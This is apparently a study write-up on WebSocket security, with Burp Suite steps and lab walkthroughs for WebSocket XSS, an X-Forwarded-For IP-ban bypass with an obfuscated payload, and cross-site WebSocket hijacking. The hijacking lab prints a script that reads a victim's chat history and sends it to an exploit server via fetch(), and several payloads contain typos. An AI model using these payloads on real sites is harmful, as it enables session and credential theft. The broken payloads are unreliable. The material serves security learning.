# WebSocket

## What is WebSocket

* WebSockets = A bi-directional, full-duplex communication protocol.
* Built on top of HTTP, but allows real-time, low-latency traffic in both directions.
* Common in chat apps, live feeds (stocks, sports), multiplayer games, etc

#### WebSocket Vs HTTP

> Feature — HTTP vs WebSocket

| Feature       |                              HTTP | WebSocket                     |
| ------------- | --------------------------------: | ----------------------------- |
| Communication |       Request -> Response (1-way) | Bi-directional (full-duplex)  |
| Lifetime      |       Short-lived per transaction | Long-lived connection         |
| Latency       |      higher (repeated handshakes) | lower (persistent connection) |
| Use cases     | Traditional page loads, REST APIs | Chat, live feeds, streaming   |

#### How WebSockets are Established

1. Starts as an HTTP request

```http
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: keep-alive, Upgrade
Sec-WebSockets-Version: 13
Cookie: Session=...
```

2. Server responds:

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSockets-Accept: <hashed key>
```

3. Connection becomes a persistent channel for messages.

* `wss://` = Encrypted WebSockets
* `ws://` = Plain WebSocket

#### What do WebSocket messages look like

* Sent using JavaScript:
  * ws.send("hello")
* Often in JSON format:

```json
{
  "user": "Ham",
  "message": "Hello"
}
```

* It is rendered on other users' browsers or stored on server

{% hint style="info" %}
Anything exploitable via HTTP can usually also be done via WebSockets
{% endhint %}

## Using Burp Suite with WebSockets

#### 1. intercept WebSocket Messages

* Open Burp > Proxy > WebSockets tab.
* Ensure interception is enabled.
* View/modify messages (client -> server or server -> client).
* Forward them.

#### 2. Replay / Modify Messages

* In WebSockets tab or intercepts tab:
  * Right-click -> Send to Repeater.
* Edit and resend messages over the same connection.
* Use Repeater History to track all sent messages.
* Right-click -> Edit and resend -> replay attacks.

#### 3. Manipulate WebSocket connection (Handshake)

* In Repeater, click pencil next to WebSocket URL.
* Options:
  * Attach to existing connection.
  * Clone connection.
  * Reconnect with new handshake.
* Edit handshake headers (e.g., Cookies, Origin, X-Forwarded-For).
* Click Connect to create new session.

## WebSocket Vulnerabilities

Most common issues:

* XSS via unsanitised WebSocket messages.
* Auth/session bypass via handshake header tampering.
* SQLi/XXE if WebSocket messages are processed directly.
* Blind vulnerabilities exploitable via OAST (Burp Collaborator).

WebSocket XSS results in stored/DOM-based XSS if no filtering is done.

\[**WebSockets often lack proper input validation since devs assume a private pipe**]

## WebSocket XSS

Lab: Manipulating WebSocket messages to exploit vulnerabilities

{% stepper %}
{% step %}
### 1. Lab Introduction

* **Target Feature**: Live Chat system on an online shop
* **Attack Vector**: WebSocket chat messages sent from client -> support agent
* **Techniques Used**: WebSocket interception and modification using Burp Suite, XSS via unsanitised HTML in WebSocket payloads
{% endstep %}

{% step %}
### 2. Reconnaissance Plan

Initial Testing Steps:

* Open the live chat in the browser
* Send a normal message like "hello"
* Observe WebSocket traffic in Burp > Proxy > WebSockets tab.
* Send a message with `<` character
* Check how the client encodes it `&lt;`

Inspecting the Vulnerability:

* Observe the WebSocket messages are JSON-based (`{"message":"hello"}`).
* Note the client sanitises/encodes `< >` — Burp can override it.
* Check if the server echoes the message directly to the support agent's browser without sanitization.
{% endstep %}

{% step %}
### 3. Vulnerability — Problem

* Source of Vulnerability:
  * The WebSocket message input from the client can be intercepted and altered.
  * The browser (client-side) tries to sanitize the payload but Burp overrides it.
* Sink of Vulnerability:
  * The support agent's browser renders the raw WebSocket message, trusting the content.
* Challenge:
  * The client encodes characters `<` into `&lt;` before sending.
  * Must intercept the message before it's encoded or modify it using Burp.
{% endstep %}

{% step %}
### 4. End Goal

* Send a malicious payload that includes a script or HTML element with JS.
* Make it render in the support agent's browser to trigger `alert(1)`.
{% endstep %}

{% step %}
### 5. Attack (First Attempt)

Payload:

```html
<img src=1 onerror='aleert(1)'>
```

* Send the message normally; Burp captures the WebSocket request.
* Edit the message body directly:

```json
{"messsage": "<img src=1 onerror='alert(1)'>"}
```
{% endstep %}

{% step %}
### 6. Exploit

1. Turn on WebSocket interception in Burp > Proxy > intercept WebSocket messages.
2. In the browser, send any message in the chat.
3. In Burp, intercept the outgoing message.
4. Replace the message value with the payload.
5. Click Forward to send it.
6. Watch for the alert(1) popup — it appears in the browser and in the support agent's browser.
{% endstep %}

{% step %}
### 7. Enumeration

* WebSocket messages are JSON formatted: `{"message":"....."}`
* Client-side sanitisation is easily bypassed using Burp.
* Server doesn't sanitise messages before sending them to support.
* The message is directly embedded into the HTML on the agent side.
{% endstep %}

{% step %}
### 8. Final Payload

```json
{"massage":"<img src=1 onerror='alert'>"}
```
{% endstep %}

{% step %}
### Why This Works

* The client tries to sanitise input, but Burp can override it.
* The server blindly reflects message content to another user (agent) without output encoding.
* The agent's browser executes the payload because it's rendered as HTML.
* This is a classic reflected XSS via WebSockets.
{% endstep %}

{% step %}
### Real-World Impact

* Attackers can steal session cookies, run malicious scripts in other users' browsers.
* Exploiting trusted user interfaces like chat agents can lead to account takeover or phishing.
* WebSocket traffic is often overlooked in security audits, making it a stealthy attack vector.
{% endstep %}
{% endstepper %}

## WebSocket Handshake Manipulation

Lab: Manipulating the WebSocket handshake (XSS via WebSocket)

{% stepper %}
{% step %}
### 1. Lab Introduction

* **Target Feature**: Live chat system implemented using WebSockets
* **Attack Vector**: Malicious WebSocket message containing XSS payload
* **Techniques Used**:
  * XSS payload injection via WebSocket message
  * WebSocket handshake manipulation
  * IP spoofing using X-Forwarded-For header
  * Obfuscation to bypass flawed filters
{% endstep %}

{% step %}
### 2. Reconnaissance Plan

Initial Testing Steps:

* Visit the lab -> open "Live Chat"
* Send the message to trigger WebSocket activity
* Inspect WebSocket message in Burp Proxy -> WebSockets tab

Inspecting the Vulnerability:

* Right-click the WebSocket message -> "Send to Repeater"
* Modify the message to inject a basic XSS payload
* Send and observe response (connection gets terminated)
{% endstep %}

{% step %}
### 3. Vulnerability — Problem

* Source of Vulnerability:
  * Chat message input via WebSocket is not properly sanitised.
  * Aggressive but flawed XSS filter attempts to block basic payloads.
* Sink of Vulnerability:
  * Reflected message is rendered in support agent's browser -> vulnerable to DOM-based XSS.
* Challenge:
  * Basic XSS is blocked.
  * IP is banned upon detection of suspicious input — must reconnect using IP spoofing.
  * Must bypass filter with obfuscated XSS.
{% endstep %}

{% step %}
### 4. End Goal

* Successfully reconnect to WebSocket server after ban.
* Deliver XSS payload that bypasses the filter.
* Trigger alert(1) in the support agent's browser.
{% endstep %}

{% step %}
### 5. Attack (First Attempt)

Payload:

```json
{"message":"<img src=1 onerror='alert(1)'>"}
```

* This standard payload is blocked.
* Result: WebSocket connection is terminated.
* All further connection attempts are rejected due to IP ban.
{% endstep %}

{% step %}
### 6. Exploit

1. In Burp Repeater, click the pencil icon to edit handshake.
2. Choose Reconnect WebSocket.
3. In the handshake editor add:

```http
X-Forwarded-For: 1.1.1.1
```

4. Click Connect -> WebSocket connection re-established.
5. Send obfuscated payload.
{% endstep %}

{% step %}
### 7. Enumeration

* Check if any headers are being validated — they aren't.
* Observe filter behaviour on malformed payloads.
* Determine case-insensitivity and character filtering.
* Confirm that backticks and casing bypass the filter.
{% endstep %}

{% step %}
### 8. Final Payload

```json
{"message":"<img src=1 oNeRrOr=alert`1`>"}
```
{% endstep %}

{% step %}
### Why This Works

* X-Forwarded-For tricks the server into thinking the request is from a new IP.
* The obfuscated message is reflected without sanitisation in support agent's browser.
* DOM interprets payload -> XSS triggered.
* WebSocket message is reflected without sanitisation in support agent's browser.
{% endstep %}

{% step %}
### Real-World Impact

* High-severity stored/reflected XSS via WebSocket input.
* Attackers could:
  * Steal session cookies.
  * Escalate to full account compromise.
  * Phish internal users.
* Highlights critical need to validate WebSocket input and handshake headers.
{% endstep %}
{% endstepper %}

{% hint style="info" %}
Cheat sheet:

* 🚪 Connect → chat generates WebSocket
* 🧨 Inject → basic XSS blocks + ban
* 🎭 Spoof → X-Forwarded-For bypasses IP ban
* 🧬 Obfuscate → mixed case + backtick bypasses filter
* 💥 Trigger → alert(1) in victim’s browser
{% endhint %}

## Cross-Site WebSocket Hijacking (CSWSH)

### What is CSWSH?

* A type of cross-site Request Forgery (CSRF) on WebSocket handshakes.
* Occurs when:
  * The WebSocket handshake relies only on cookies for auth/session.
  * No CSRF token or origin validation is present.
* Attacker opens a WebSocket connection to the app from their own site using victim's session cookies.

**Its like Borrowing a Walkie-Talkie**

* Imagine a walkie-talkie chatroom (WebSocket) only checks your voice (**session cookie**) but not who is holding the radio.
* The attacker tunes into the same channel:
  * The system only checks for the channel key (**cookie**) and not who's speaking.
  * Talks (send messages) as the victim.
  * Listens (receives messages) meant for the victim.

#### Breakdown

* Vulnerability point: the WebSocket handshake is not protected (no CSRF token, no Origin check).
* Attack vector: a malicious site hosts JS that creates:

```js
new WebSocket("wss://vulnerable-app.com/chat");
```

* Victim visits the site while logged into vulnerable app -> browser sends valid cookies.
* Attacker now has 2-way communication with app as the victim.

#### Impact

* Unauthorised actions — send messages (e.g., send money, delete data) as the victim.
* Data theft (2-way access) — read sensitive messages sent from server to victim.
* Persistent access — remain connected and monitor real-time data.

#### Exploitation Checklist

* Look for WebSocket handshake with:
  * Only cookies for auth/session.
  * No CSRF token in URL/headers.
  * No Origin or Sec-WebSocket-Protocol validation.

Example handshake:

```http
GET /chat HTTP/1.1
Host: vulnerable.com
Cookie: session=abcd1234
Upgrade: websocket
Connection: Upgrade
```

* Sec-WebSocket-Key is not a security feature — it's only for proxy caching.

#### Exploitation Flow

* Victim is logged into vulnerable site.
* Victim visits attacker's site.
* Attacker runs:

```js
let ws = new WebSocket("wss://vulnerable.com/chat");
ws.onmessage = (msg) => console.log("Got victim data: ", msg.data);
ws.send('{"action":"delete_user"}');
```

### Memory Aid – “STICKY”

* S – Session cookie only (no CSRF token)
* T – Third-party page (attacker site)
* I – Initiates WebSocket from attacker domain
* C – Cookies auto-included by browser
* K – Keep-alive 2-way channel
* Y – You get read + write as the victim

## Lab: Cross-Site WebSocket Hijacking

{% stepper %}
{% step %}
### 1. Lab Introduction

* **Target Feature**: Live chat system using WebSockets on an online shopping platform
* **Attack Vector**: Cross-site WebSocket Hijacking (CSWSH) via a malicious JavaScript payload hosted on the exploit server
* **Techniques Used**:
  * WebSocket handshake analysis
  * "READY" message triggering a chat history
  * Hosting JS payload on exploit server
  * Exfiltration via fetch
  * Session cookie misuse
{% endstep %}

{% step %}
### 2. Reconnaissance Plan

Initial Testing Steps:

* Open the live chat and send multiple messages.
* Observe WebSocket connection in Burp > WebSockets tab.
* Reload chat page -> confirm that history is auto loaded (via "READY" message).

Inspecting the Vulnerability:

* Analyse the WebSocket handshake (GET /chat) -> only uses cookies for session.
* Confirm no CSRF token, no Origin header validation.
* Confirm that READY message triggers the server to return chat history.
{% endstep %}

{% step %}
### 3. Vulnerability — Problem

* Source of Vulnerability:
  * WebSocket handshake relies only on cookies.
  * No CSRF token or unpredictable value in the request.
* Sink of Vulnerability:
  * The "READY" message causes server to return sensitive chat history.
* Challenge:
  * Deliver JS payload to victim via the exploit server.
  * Exfiltrate chat content using built-in tools.
{% endstep %}

{% step %}
### 4. End Goal

* Deliver JS payload to victim -> auto-connects to WebSocket with their cookies.
* Send READY, receive chat history and exfiltrate it to exploit server.
* Extract credentials from chat history and log in as victim.
{% endstep %}

{% step %}
### 5. Attack (First Attempt)

Payload:

```html
<script>
  var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
  ws.onopen = function() {
    ws.send("READY");
  };
  ws.onmessage = function(event) {
    fetch('https://exploit-YOUR-ID.web-security-academy.net', {
      method: 'POST',
      mode: 'no-cors',
      body: event.data
    });
  };
</script>
```

* Replace YOUR-LAB-ID and exploit-YOUR-ID appropriately.
* Test using "View exploit" to confirm if the payload works.
{% endstep %}

{% step %}
### 6. Exploit

1. Copy WebSocket URL from live chat (`wss://.../chat`).
2. Paste it into the payload inside the exploit server HTML body.
3. Use fetch() to send messages to your exploit server.
4. Deliver exploit to victim (click "Deliver exploit").
5. Wait and view logs — find leaked chat message with credentials.
{% endstep %}

{% step %}
### 7. Enumeration

* Confirm "READY" triggers chat history load.
* Verify if WebSocket uses only cookies.
* Look for credentials (e.g., username/password) in returned JSON messages.
* Ensure exploit server can receive the fetch() exfiltrated data.
{% endstep %}

{% step %}
### 8. Final Payload

```html
<script>
  var ws = new WebSocket("wss://0af000ee048a72fc80cf1cbb00780049.web-security-academy.net/chat"); 
  ws.onopen = function() {
    ws.send("READY");
  };
  ws.onmessage = function(event) {
    fetch("https://exploit-0a1b00b004b1723b80041b9b01150075.exploit-server.net/exploit?message=" + btoa(event.data), {
      mode: "no-cors"
    });
  };
</script>
```
{% endstep %}

{% step %}
### Why This Works

* Browser auto-sends session cookie during handshake -> no CSRF token required.
* WebSocket allows 2-way communication, unlike traditional CSRF.
* "READY" command leaks all chat history, including credentials.
* Attacker's page mimics a victim's browser session from a different origin.
{% endstep %}

{% step %}
### Real-World Impact

* Full account takeover.
* Data exfiltration via WebSocket.
* Misuse of browser trust in cross-origin requests.
* Demonstrates the danger of relying solely on cookies for session auth in WebSocket handshakes.
{% endstep %}
{% endstepper %}

***

Links:

* https://chrome.google.com/webstore/de...
* https://addons.mozilla.org/en-US/fire...
